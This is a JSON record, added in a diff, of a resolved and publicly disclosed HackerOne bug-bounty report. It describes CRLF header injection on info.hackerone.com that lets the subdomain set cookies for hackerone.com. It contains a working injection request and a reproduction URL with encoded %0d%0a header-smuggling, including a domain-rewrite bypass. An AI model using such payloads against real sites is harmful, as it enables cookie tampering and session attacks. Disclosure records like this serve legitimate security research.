@@ -1,0 +1,133 @@
+{
+  "id": 97292,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85NzI5Mg==",
+  "url": "https://hackerone.com/reports/97292",
+  "title": "HTTP header injection in info.hackerone.com allows setting cookies for hackerone.com",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2015-11-02T17:58:35.684Z",
+  "submitted_at": "2015-11-02T17:58:35.684Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "harisec",
+    "url": "/harisec",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/003/968/7f3126cb24b0dd55034e93fb7e809df7e1000e77_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 13,
+    "url": "https://hackerone.com/security",
+    "handle": "security",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "HackerOne",
+      "twitter_handle": "Hacker0x01",
+      "website": "https://hackerone.com",
+      "about": "Vulnerability disclosure should be safe, transparent, and rewarding."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2015-12-02T05:31:31.937Z",
+  "bug_reporter_agreed_on_going_public_at": "2015-12-02T05:31:31.578Z",
+  "team_member_agreed_on_going_public_at": "2015-12-02T05:28:55.545Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "The subdomain **info.hackerone.com** is vulnerable to HTTP header injection. I'm aware that you are only interested in critical issues affecting this subdomain.\n\nHowever, you may be interested in this issue as a vulnerability in this domain may affect the domain **hackerone.com**.\n\nThe vulnerability is a classic HTTP header injection. By making the following HTTP request it's possible to inject additional HTTP headers:\n\n```        \nGET /%0d%0aset-cookie%20%3amycookie%3dmyvalue;%20%44omain%20%3d.hackerone.com HTTP/1.1\nCache-Control: no-cache\nAccept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36\nAccept-Language: en-us,en;q=0.5\nHost: info.hackerone.com\nCookie: BIGipServerab12web-app_https=688587018.47873.0000; BIGipServerab12web-app_http=621478154.20480.0000; __cfduid=db2a412f6305ca8dcc97a7cf06d1da6271446241668; __cfduid=d50b9d3c96413964ca4674c7ebd24ba581446241674\nAccept-Encoding: gzip, deflate\n```\n        \nThis HTTP request will produce the following response:\n```\nHTTP/1.1 302 Found\nDate: Mon, 02 Nov 2015 17:40:28 GMT\nContent-Type: text/html; charset=iso-8859-1\nContent-Length: 265\nConnection: keep-alive\nCf-Railgun: direct (starting new WAN connection)\nLocation: https://info.hackerone.com/\nSet-Cookie: mycookie=myvalue; Domain =.hackerone.com\nVary: Accept-Encoding\nServer: cloudflare-nginx\nCF-RAY: 23f19fec71ae3494-LHR\n```\n\nAs you can see a new header `Set-Cookie: mycookie=myvalue; Domain =.hackerone.com` was injected in the response.  Notice the extra space after the Domain keyword? That was necessary to bypass some code that was automatically setting the cookie domain to info.hackerone.com.\n\nBecause subdomains can set cookies for the root domain, info.hackerone.com can set cookies for the main domain hackerone.com.\n\nTo reproduce, follow the next steps:\n- Visit the following URL in Internet Explorer. I've reproduced with Internet Explorer 11 (exact version **11.0.9600.17691**)\n \nhttp://info.hackerone.com/%0d%0aset-cookie%20%3amycookie%3dmyvalue;%20%44omain%20%3d.hackerone.com\n\n- Check the cookies from the domain hackerone.com by entering Internet Explorer console mode (F12) and the console tag.\n\n**document.cookie**\n**\"_ga=GA1.2.1697487504.1446486792; _gat=1; mycookie=myvalue\"**\n\nA new cookie named **mycookie** with the value **myvalue** was set.\n\n",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 59914,
+      "file_name": "h1-before.PNG",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/059/914/9b43905b1c3696002e65212c65449d2b17fd831b/h1-before.PNG?response-content-disposition=attachment%3B%20filename%3D%22h1-before.PNG%22%3B%20filename%2A%3DUTF-8%27%27h1-before.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWLQLJJMC%2F20250922%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250922T235047Z&X-Amz-Expires=3278&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIB3dGZZPPM8cst5H4xaqzxVRkOZenxalmd8Rm9k%2F3n8VAiAoaH6PkubvMDsZ4%2BoV1R2M20PdR%2FUQKZziTDBF3yxX5yqyBQg0EAMaDDAxMzYxOTI3NDg0OSIMHcDKi%2Bw%2Blku%2FMsilKo8Fmd2Jgnc639ovvJMX96Ug3RlksWa9u42SeKjYCAmgm2l0BGuvFcXdaryTAx6cXUnh5pr4sfYc2Laf4Gbr2%2BvOTTdUHSc6DGmQW%2FPxHz%2FjcGVXQStld%2BpwoQa%2FwduSQosO262%2FOiWMXLID%2BbvTkzyDcvWKVBIaXToHhWTDQCyL4gHTEFP67js6MyjNOIHRNqrZMClZzXmwg4ZAw%2B5wwzNmbkC2E0OeBHzokuYxlk2wPLuob7LuAjW5NPBJmzyxZluPvosi%2BUIb%2FHlnzBG6zncDC%2FmboVRbzEvlf7T6fA0Pg1gp38ZYeXx5zSo1QcN7qw8%2FEU4DiYrCBqM6LsQ6nthGXmgrUGjxkcJeA1ppTOx%2BEkir4c5dFQ7Q8Iofn2tXLouya9CBEpHcrWoRDwrFYFGI%2F9cLps1FYY3MdmoAgCP6Gcldv8eMG18loPBXrXwVfVHAYx9zdMeooxH8wldrWhZ4C9RSW6%2FeGBrwZCc3j5UvGhLWpuUEZuM8GaJ8NkAxIwEE8QwJQQop0tZyqD2wG8YAaau1wctjM5S9ymvDCLkyfHPLPvWsmQ5ldUzFDXmyVzu6k%2B1c%2FqpWSn4HeJbSP5XSWGKk%2FKwdVoN4u%2FWL7Bo0DUTCo%2B9uvWiED09EKlex2YbcaS1pKdCujnY41UXvETC%2Fv0u%2FUNKT%2F8YIm0fGXyOyI6Hl%2B%2BFSuY3F%2FHSVcWz5EfVOJV1BF86IfD6bQtAjb%2BJtmwEg%2FCKWlO5qyUB3yNpkwStsfbFZuTJMEVqwVdS45e5YYKcgYVRz%2FQ5AnITayT2rfK13X%2BWXS7LAx4bg9vzFimSN30QVLE%2BmgUh4FZ%2BTob91icqFRv68vck%2B6tqKzckTFxnsmN67kLcXwsY9VkQcUDCMrMbGBjqyAcB9M1%2F5D%2BkNHGa2twS4IndRSPw4ZN8sYmzZjs9I1JExPBZJWA8SXUrDnWcg%2Bq2IopI%2BtGk3o%2BCRYtuxTveKchnABWbC3ll079J0Fd4Qqwf6TKGomXZ78r9UHVIs3q85bIfp058X1hN7ivU57QUSAvZI%2BtiDCsCWEMShQRX8CPDCmh5hH5w4GqSvsrvd1EJ4a94VnLEozQJhg2sGsY6JGF8vynzWjEOh7%2F27BPV7yAh00Uc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=8882c0e7f151521f5f805f714dbeb570dd3977880075cc7acafc5975016fd72c",
+      "file_size": 606094,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 59915,
+      "file_name": "h1-after.PNG",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/059/915/879550c2aea55ce7106d599bee974bbc2d65eef1/h1-after.PNG?response-content-disposition=attachment%3B%20filename%3D%22h1-after.PNG%22%3B%20filename%2A%3DUTF-8%27%27h1-after.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWLQLJJMC%2F20250922%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250922T235047Z&X-Amz-Expires=3278&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIB3dGZZPPM8cst5H4xaqzxVRkOZenxalmd8Rm9k%2F3n8VAiAoaH6PkubvMDsZ4%2BoV1R2M20PdR%2FUQKZziTDBF3yxX5yqyBQg0EAMaDDAxMzYxOTI3NDg0OSIMHcDKi%2Bw%2Blku%2FMsilKo8Fmd2Jgnc639ovvJMX96Ug3RlksWa9u42SeKjYCAmgm2l0BGuvFcXdaryTAx6cXUnh5pr4sfYc2Laf4Gbr2%2BvOTTdUHSc6DGmQW%2FPxHz%2FjcGVXQStld%2BpwoQa%2FwduSQosO262%2FOiWMXLID%2BbvTkzyDcvWKVBIaXToHhWTDQCyL4gHTEFP67js6MyjNOIHRNqrZMClZzXmwg4ZAw%2B5wwzNmbkC2E0OeBHzokuYxlk2wPLuob7LuAjW5NPBJmzyxZluPvosi%2BUIb%2FHlnzBG6zncDC%2FmboVRbzEvlf7T6fA0Pg1gp38ZYeXx5zSo1QcN7qw8%2FEU4DiYrCBqM6LsQ6nthGXmgrUGjxkcJeA1ppTOx%2BEkir4c5dFQ7Q8Iofn2tXLouya9CBEpHcrWoRDwrFYFGI%2F9cLps1FYY3MdmoAgCP6Gcldv8eMG18loPBXrXwVfVHAYx9zdMeooxH8wldrWhZ4C9RSW6%2FeGBrwZCc3j5UvGhLWpuUEZuM8GaJ8NkAxIwEE8QwJQQop0tZyqD2wG8YAaau1wctjM5S9ymvDCLkyfHPLPvWsmQ5ldUzFDXmyVzu6k%2B1c%2FqpWSn4HeJbSP5XSWGKk%2FKwdVoN4u%2FWL7Bo0DUTCo%2B9uvWiED09EKlex2YbcaS1pKdCujnY41UXvETC%2Fv0u%2FUNKT%2F8YIm0fGXyOyI6Hl%2B%2BFSuY3F%2FHSVcWz5EfVOJV1BF86IfD6bQtAjb%2BJtmwEg%2FCKWlO5qyUB3yNpkwStsfbFZuTJMEVqwVdS45e5YYKcgYVRz%2FQ5AnITayT2rfK13X%2BWXS7LAx4bg9vzFimSN30QVLE%2BmgUh4FZ%2BTob91icqFRv68vck%2B6tqKzckTFxnsmN67kLcXwsY9VkQcUDCMrMbGBjqyAcB9M1%2F5D%2BkNHGa2twS4IndRSPw4ZN8sYmzZjs9I1JExPBZJWA8SXUrDnWcg%2Bq2IopI%2BtGk3o%2BCRYtuxTveKchnABWbC3ll079J0Fd4Qqwf6TKGomXZ78r9UHVIs3q85bIfp058X1hN7ivU57QUSAvZI%2BtiDCsCWEMShQRX8CPDCmh5hH5w4GqSvsrvd1EJ4a94VnLEozQJhg2sGsY6JGF8vynzWjEOh7%2F27BPV7yAh00Uc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=951a1797fe20d6109e9cf51cdac3a8e6e149e63ca610a2343116674d439b42b2",
+      "file_size": 631612,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 59916,
+      "file_name": "h1-request.PNG",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/059/916/b3d65d2e639de469a38ac6646177c97a84ce1b63/h1-request.PNG?response-content-disposition=attachment%3B%20filename%3D%22h1-request.PNG%22%3B%20filename%2A%3DUTF-8%27%27h1-request.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWLQLJJMC%2F20250922%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250922T235047Z&X-Amz-Expires=3278&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIB3dGZZPPM8cst5H4xaqzxVRkOZenxalmd8Rm9k%2F3n8VAiAoaH6PkubvMDsZ4%2BoV1R2M20PdR%2FUQKZziTDBF3yxX5yqyBQg0EAMaDDAxMzYxOTI3NDg0OSIMHcDKi%2Bw%2Blku%2FMsilKo8Fmd2Jgnc639ovvJMX96Ug3RlksWa9u42SeKjYCAmgm2l0BGuvFcXdaryTAx6cXUnh5pr4sfYc2Laf4Gbr2%2BvOTTdUHSc6DGmQW%2FPxHz%2FjcGVXQStld%2BpwoQa%2FwduSQosO262%2FOiWMXLID%2BbvTkzyDcvWKVBIaXToHhWTDQCyL4gHTEFP67js6MyjNOIHRNqrZMClZzXmwg4ZAw%2B5wwzNmbkC2E0OeBHzokuYxlk2wPLuob7LuAjW5NPBJmzyxZluPvosi%2BUIb%2FHlnzBG6zncDC%2FmboVRbzEvlf7T6fA0Pg1gp38ZYeXx5zSo1QcN7qw8%2FEU4DiYrCBqM6LsQ6nthGXmgrUGjxkcJeA1ppTOx%2BEkir4c5dFQ7Q8Iofn2tXLouya9CBEpHcrWoRDwrFYFGI%2F9cLps1FYY3MdmoAgCP6Gcldv8eMG18loPBXrXwVfVHAYx9zdMeooxH8wldrWhZ4C9RSW6%2FeGBrwZCc3j5UvGhLWpuUEZuM8GaJ8NkAxIwEE8QwJQQop0tZyqD2wG8YAaau1wctjM5S9ymvDCLkyfHPLPvWsmQ5ldUzFDXmyVzu6k%2B1c%2FqpWSn4HeJbSP5XSWGKk%2FKwdVoN4u%2FWL7Bo0DUTCo%2B9uvWiED09EKlex2YbcaS1pKdCujnY41UXvETC%2Fv0u%2FUNKT%2F8YIm0fGXyOyI6Hl%2B%2BFSuY3F%2FHSVcWz5EfVOJV1BF86IfD6bQtAjb%2BJtmwEg%2FCKWlO5qyUB3yNpkwStsfbFZuTJMEVqwVdS45e5YYKcgYVRz%2FQ5AnITayT2rfK13X%2BWXS7LAx4bg9vzFimSN30QVLE%2BmgUh4FZ%2BTob91icqFRv68vck%2B6tqKzckTFxnsmN67kLcXwsY9VkQcUDCMrMbGBjqyAcB9M1%2F5D%2BkNHGa2twS4IndRSPw4ZN8sYmzZjs9I1JExPBZJWA8SXUrDnWcg%2Bq2IopI%2BtGk3o%2BCRYtuxTveKchnABWbC3ll079J0Fd4Qqwf6TKGomXZ78r9UHVIs3q85bIfp058X1hN7ivU57QUSAvZI%2BtiDCsCWEMShQRX8CPDCmh5hH5w4GqSvsrvd1EJ4a94VnLEozQJhg2sGsY6JGF8vynzWjEOh7%2F27BPV7yAh00Uc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=4a2cb0e86184a9c1c206e3798f201346b75e52260597a97388ccf45fd4afbe3b",
+      "file_size": 99828,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2016-01-01T05:28:55.873Z",
+  "allow_singular_disclosure_after": -306958911.25820285,
+  "singular_disclosure_allowed": true,
+  "vote_count": 18,
+  "voters": [
+    "jensec",
+    "shubham_srt",
+    "f_m",
+    "savitar0x01",
+    "its_afolic",
+    "apapedulimu",
+    "ashfeilrbx",
+    "pr0f0x01",
+    "arwildo",
+    "ak1t4",
+    "and 8 more..."
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
